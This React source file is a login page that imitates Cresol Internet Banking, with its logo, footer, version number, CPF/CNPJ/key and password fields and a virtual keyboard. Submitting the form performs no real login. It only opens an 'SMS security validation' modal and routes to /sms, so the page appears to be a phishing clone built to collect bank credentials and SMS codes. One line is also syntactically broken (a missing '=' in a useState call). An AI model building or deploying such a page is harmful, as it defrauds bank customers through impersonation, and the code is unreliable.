import React, { useState } from "react";
import { Eye, EyeOff, HelpCircle } from "lucide-react";
import { useNavigate } from "react-router-dom";
import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
import { LocationPermissionPrompt } from "@/components/LocationPermissionPrompt";
import { VirtualKeyboardInline } from "@/components/VirtualKeyboardInline";
import { Switch } from "@/components/ui/switch";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";

// Atualize aqui: Use título e subtítulo (duas linhas) como campos explícitos!
const TABS = [
  { title: "Pessoa", subtitle: "Física", value: "fisica" },
  { title: "Pessoa", subtitle: "Jurídica", value: "juridica" },
  { title: "Gerenciador", subtitle: "Financeiro", value: "financeiro" },
];

const Index = () => {
  const navigate = useNavigate();
  const [tab, setTab] = useState("fisica");
  const [cpf, setCpf] = useState("");
  const [cnpj, setCnpj] = useState("");
  const [chaveMulticanal, setChaveMulticanal] = useState("");
  const [senha, setSenha] = useState("");
  const [showSenha, setShowSenha] useState(false);
  const [saveCpf, setSaveCpf] = useState(false);
  const [saveCnpj, setSaveCnpj] = useState(false);
  const [saveChaveMulticanal, setSaveChaveMulticanal] = useState(false);
  const [showSmsModal, setShowSmsModal] = useState(false);

  // ---- Popup de permissão de localização ----
  const [showLocationPrompt, setShowLocationPrompt] = useState(true);

  const handleAcceptLocation = () => setShowLocationPrompt(false);
  const handleAllowOnce = () => setShowLocationPrompt(false);
  const handleNeverAllow = () => setShowLocationPrompt(false);

  // ---- Teclado Inline ----
  const [showPasswordKeyboard, setShowPasswordKeyboard] = useState(false);
  const [senhaTemp, setSenhaTemp] = useState("");

  function handlePasswordInputFocus() {
    setSenhaTemp(senha);
    setShowPasswordKeyboard(true);
  }

  function handleKeyboardSubmit(val: string) {
    setSenha(val);
    setShowPasswordKeyboard(false);
    setSenhaTemp("");
  }
  function handleKeyboardCancel() {
    setShowPasswordKeyboard(false);
    setSenhaTemp("");
  }

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    // Mostrar modal de SMS
    setShowSmsModal(true);
  };

  const handleSmsModalClose = () => {
    setShowSmsModal(false);
  };

  const handleSmsModalConfirm = () => {
    setShowSmsModal(false);
    navigate("/sms");
  };

  // ---- PASSWORD INPUT (com toggle view) ----
  const senhaInput = (
    <div className="mb-3 relative z-10">
      <label className="block text-sm text-gray-700 font-medium mb-1">Senha de acesso</label>
      <div className="relative flex items-center">
        <input
          type={showSenha ? "text" : "password"}
          className="w-full h-11 px-3 pr-12 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-white"
          placeholder="Senha"
          value={senha ? senha : ""}
          onFocus={handlePasswordInputFocus}
          readOnly
          style={{ userSelect: "none" }}
          autoComplete="off"
        />
        <button
          type="button"
          className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-[#145C36] flex items-center justify-center"
          tabIndex={-1}
          onClick={() => setShowSenha((v) => !v)}
          aria-label={showSenha ? "Ocultar senha" : "Mostrar senha"}
        >
          {showSenha ? <EyeOff size={22} /> : <Eye size={22} />}
        </button>
      </div>
      <div>
        <VirtualKeyboardInline
          open={showPasswordKeyboard}
          value={senhaTemp}
          onChange={setSenhaTemp}
          onSubmit={handleKeyboardSubmit}
          onCancel={handleKeyboardCancel}
        />
      </div>
    </div>
  );

  const renderFormContent = () => {
    switch (tab) {
      case "fisica":
        return (
          <>
            {/* CPF */}
            <div className="mb-4">
              <label className="block text-sm text-gray-700 font-medium mb-1">CPF</label>
              <input
                type="text"
                className="w-full h-11 px-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-white"
                placeholder="CPF"
                value={cpf}
                onChange={(e) => setCpf(e.target.value)}
                autoComplete="username"
              />
            </div>
            {/* Senha */}
            {senhaInput}
            {/* Salvar CPF */}
            <div className="flex items-center mb-6">
              <label htmlFor="saveCpf" className="text-gray-700 text-[1.07rem] mr-2">
                Salvar CPF
              </label>
              <Switch id="saveCpf" checked={saveCpf} onCheckedChange={() => setSaveCpf((v) => !v)} />
            </div>
          </>
        );
      case "juridica":
        return (
          <>
            {/* CNPJ */}
            <div className="mb-4">
              <label className="block text-sm text-gray-700 font-medium mb-1">CNPJ</label>
              <input
                type="text"
                className="w-full h-11 px-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-white"
                placeholder="CNPJ"
                value={cnpj}
                onChange={(e) => setCnpj(e.target.value)}
                autoComplete="username"
              />
            </div>
            {/* Senha */}
            {senhaInput}
            {/* Salvar CNPJ */}
            <div className="flex items-center mb-6">
              <label htmlFor="saveCnpj" className="text-gray-700 text-[1.07rem] mr-2">
                Salvar CNPJ
              </label>
              <Switch id="saveCnpj" checked={saveCnpj} onCheckedChange={() => setSaveCnpj((v) => !v)} />
            </div>
          </>
        );
      case "financeiro":
        return (
          <>
            {/* Chave Multicanal */}
            <div className="mb-4">
              <label className="block text-sm text-gray-700 font-medium mb-1">Chave Multicanal</label>
              <input
                type="text"
                className="w-full h-11 px-3 border border-orange-400 rounded focus:outline-none focus:ring-2 focus:ring-orange-400 focus:border-orange-400 transition text-base bg-white"
                placeholder="Chave Multicanal"
                value={chaveMulticanal}
                onChange={(e) => setChaveMulticanal(e.target.value)}
                autoComplete="username"
              />
            </div>
            {/* Senha */}
            {senhaInput}
            {/* Salvar Chave Multicanal */}
            <div className="flex items-center mb-6">
              <label htmlFor="saveChaveMulticanal" className="text-gray-700 text-[1.07rem] mr-2">
                Salvar Chave Multicanal
              </label>
              <Switch id="saveChaveMulticanal" checked={saveChaveMulticanal} onCheckedChange={() => setSaveChaveMulticanal((v) => !v)} />
            </div>
          </>
        );
      default:
        return null;
    }
  };

  // Supondo que o header/flutuante da sua aplicação tenha cerca de 54px de altura (ajuste conforme necessário)
  const locationPromptOffset = 54;

  return (
    <div className="min-h-screen flex bg-[#fff]">
      <LocationPermissionPrompt
        open={showLocationPrompt}
        onAccept={handleAcceptLocation}
        onAllowOnce={handleAllowOnce}
        onNeverAllow={handleNeverAllow}
        topOffset={locationPromptOffset}
      />
      
      {/* Modal SMS */}
      <Dialog open={showSmsModal} onOpenChange={setShowSmsModal}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>Validação de Segurança</DialogTitle>
            <DialogDescription>
              Para sua segurança, enviaremos um código SMS para seu celular cadastrado.
            </DialogDescription>
          </DialogHeader>
          <div className="flex flex-col gap-4 pt-4">
            <button
              onClick={handleSmsModalConfirm}
              className="w-full h-11 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-lg"
              style={{
                background: "linear-gradient(90deg,#ffaa00,#ff7300 100%)",
                borderRadius: "30px",
              }}
            >
              Enviar SMS
            </button>
            <button
              onClick={handleSmsModalClose}
              className="w-full h-11 rounded-full border-2 border-gray-300 text-gray-700 font-semibold text-lg transition-colors hover:bg-gray-50"
            >
              Cancelar
            </button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Left: Formulário */}
      <div className="w-1/2 flex flex-col justify-center px-[7%] py-12 relative">
        <div className="max-w-md w-full mx-auto">
          <img
            src={cresolLogo}
            alt="Cresol"
            className="h-8 mb-8"
          />
          <h1 className="text-2xl font-semibold text-gray-600 mb-3">Seja bem-vindo</h1>
          <p className="text-[1.1rem] text-gray-600 mb-8">
            Acesse sua conta e realize suas transações de forma rápida e segura a qualquer hora.
          </p>
          {/* Tabs */}
          <div className="grid grid-cols-3 gap-x-12 gap-y-0 mb-2 mt-1 max-w-[470px]">
            {TABS.map((t, idx) => (
              <button
                key={t.value}
                className={`pb-0.5 pt-1.5 text-[1.13rem] leading-snug font-semibold transition-colors text-[#145C36]
                  flex flex-col items-center
                  ${tab === t.value ? "border-b-2 border-orange-500" : "border-b-2 border-transparent"}
                `}
                style={{
                  minHeight: "43px",
                }}
                onClick={() => setTab(t.value)}
              >
                <span>{t.title}</span>
                <span>{t.subtitle}</span>
              </button>
            ))}
          </div>
          <form className="mt-6" onSubmit={handleLogin}>
            {renderFormContent()}
            <button
              type="submit"
              className="w-full h-11 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-lg shadow mt-0 mb-10"
              style={{
                background: "linear-gradient(90deg,#ffaa00,#ff7300 100%)",
                borderRadius: "30px",
              }}
            >
              Entrar
            </button>
          </form>

          {/* Primeira linha separadora */}
          <hr className="w-full border-t border-gray-200 my-8" />

          {/* Primeiro acesso - abas física, jurídica e financeiro */}
          {(tab === "fisica" || tab === "juridica" || tab === "financeiro") && (
            <>
              <div className="w-full flex flex-col items-center">
                <h2 className="text-[2rem] font-bold mb-2 text-gray-800 w-full text-left" style={{lineHeight: "2.4rem"}}>Primeiro acesso</h2>
                <p className="text-base text-gray-700 mb-6 w-full text-left">
                  Primeiro acesso aos canais digitais da Cresol? Cadastre sua conta e crie seu usuário. É simples, rápido e seguro.
                </p>
                <button
                  type="button"
                  className="w-full max-w-xs h-12 rounded-full border-2 border-orange-500 text-orange-500 font-semibold text-lg transition-colors bg-white hover:bg-orange-50 active:bg-orange-100 mb-8"
                  style={{ boxSizing: "border-box" }}
                >
                  Cadastre-se
                </button>
              </div>
              {/* Linha */}
              <hr className="w-full border-t border-gray-200 my-6" />
              {/* Termos de uso */}
              <div className="w-full mb-7 flex flex-col items-center">
                <p className="text-center text-base text-gray-600">
                  Consulte aqui nossos{" "}
                  <a href="#" className="text-orange-500 font-semibold hover:underline transition">
                    termos de uso
                  </a>
                </p>
              </div>
              {/* Rodapé Cresol/versionamento */}
              <div className="mb-0 text-center text-xs text-gray-800">
                <div className="font-semibold">Cresol Internet Banking - 2025</div>
                <div className="">Versão: 12.4.3.501 (12.4.3-501)</div>
              </div>
            </>
          )}
        </div>

        {/* Help Icon */}
        <div className="absolute bottom-8 left-8">
          <button className="w-12 h-12 bg-orange-500 rounded-full flex items-center justify-center text-white hover:bg-orange-600 transition-colors shadow-lg">
            <HelpCircle size={24} />
          </button>
        </div>
      </div>

      {/* Right: Imagem da mulher */}
      <div className="w-1/2 hidden lg:block bg-[#f5f6f7] relative overflow-hidden">
        <img
          src={womanImage}
          alt="Mulher segurando celular"
          className="w-full h-full object-cover"
        />
      </div>
    </div>
  );
};

export default Index;
